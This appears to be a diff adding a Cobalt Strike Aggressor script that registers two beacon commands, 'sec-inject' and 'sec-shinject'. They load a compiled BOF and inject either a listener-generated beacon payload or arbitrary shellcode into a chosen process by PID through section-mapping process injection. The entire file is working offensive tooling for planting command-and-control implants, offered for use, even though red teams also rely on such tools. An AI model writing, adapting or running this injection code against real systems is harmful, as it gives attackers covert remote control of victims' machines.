@@ -1,0 +1,109 @@
+beacon_command_register(
+    "sec-inject", 
+    "Injects beacon shellcode into target process using section mapping", 
+    "Synopsis: sec-inject PID LISTENER_NAME"
+);
+
+beacon_command_register(
+    "sec-shinject", 
+    "Injects desired shellcode into target process using section mapping", 
+    "Synopsis: sec-shinject PID /path/to/bin"
+);
+
+alias sec-shinject {
+    if(size(@_) != 3)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("sec-shinject"));
+        return;
+    }
+
+    local('$barch $handle $data $args');
+    
+    # Get beacon architecture
+    $barch = barch($1);
+
+    # Ensure we are in an x64 beacon
+    if ($barch !eq 'x64') {
+        berror("We just support x64 at the moment.");
+        return;
+    }
+
+    # Verify PID is an integer
+    # Conditional taken from: https://github.com/connormcgarr/cThreadHijack/blob/main/cThreadHijack.cna
+    if ((!-isnumber $2) || (int($2) <= 0))
+    {
+        berror($bid, "Please enter a valid PID");
+        return;
+    }
+
+    # Load BOF
+    $handle = openf(script_resource("secinject. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Read shellcode from bin
+    local('$sc_handle $sc_data');
+    $sc_handle = openf($3);
+    $sc_data = readb($sc_handle, -1);
+    closef($sc_handle);
+
+    # Pack args
+    $args = bof_pack($1,"ib", $2, $sc_data);
+    
+    btask($1, "SecInject: Section Mapping Process Injection (@apokryptein | github.com/apokryptein)");
+    btask($1, "Injecting shellcode: $+ $3");
+    btask($1, "Target Process: $+ $2");
+
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias sec-inject {
+    if(size(@_) != 3)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("sec-inject"));
+        return;
+    }
+
+    local('$barch $handle $data $args');
+    
+    # Get beacon architecture
+    $barch = barch($1);
+
+    # Ensure we are in an x64 beacon
+    if ($barch !eq 'x64') {
+        berror("We just support x64 at the moment.");
+        return;
+    }
+
+    # Verify PID is an integer
+    # Conditional borrowed from: https://github.com/connormcgarr/cThreadHijack/blob/main/cThreadHijack.cna
+    if ((!-isnumber $2) || (int($2) <= 0))
+    {
+        berror($bid, "Please enter a valid PID");
+        return;
+    }
+
+    # Verify listener exists
+    if ($3 !in listeners()) {
+        berror("That listener seems invalid.");
+        return;
+    }
+
+    # Load BOF
+    $handle = openf(script_resource("secinject. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # Generate payload based on supplied beacon (currently x64 only)
+    local('$payload');
+    $payload = payload($3, "x64", "thread");
+
+    # Pack args
+    $args = bof_pack($1,"ib", $2, $payload);
+    btask($1, "SecInject: Section Mapping Process Injection (@apokryptein | github.com/apokryptein)");
+    btask($1, "Injecting beacon into PID: $+ $2");
+
+    beacon_inline_execute($1, $data, "go", $args);
+}
